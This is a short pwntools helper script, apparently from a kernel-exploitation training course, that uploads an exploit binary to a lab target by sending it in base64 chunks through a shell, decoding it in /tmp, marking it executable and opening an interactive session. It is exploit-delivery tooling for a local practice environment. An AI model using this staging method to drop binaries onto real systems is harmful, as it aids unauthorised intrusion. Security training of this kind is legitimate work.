# original https://github.com/ptr-yudai/pawnyable
from pwn import *
import base64


def run(cmd):
    io.sendlineafter(b"$ ", cmd.encode())
    io.recvline()


with open("./root/exploit", "rb") as f:
    payload = base64.b64encode(f.read()).decode()

HOST = "localhost"
PORT = 1234
# io = remote("HOST", PORT)  # remote
io = process("./run.sh")

run("cd /tmp")

print("Uploading...")
for i in range(0, len(payload), 512):
    print(f"Uploading... {i:#x} / {len(payload):#x}")
    run('echo "{}" >> b64exp'.format(payload[i : i + 512]))


run("base64 -d b64exp > exploit")
run("rm b64exp")
run("chmod +x exploit")

io.interactive()
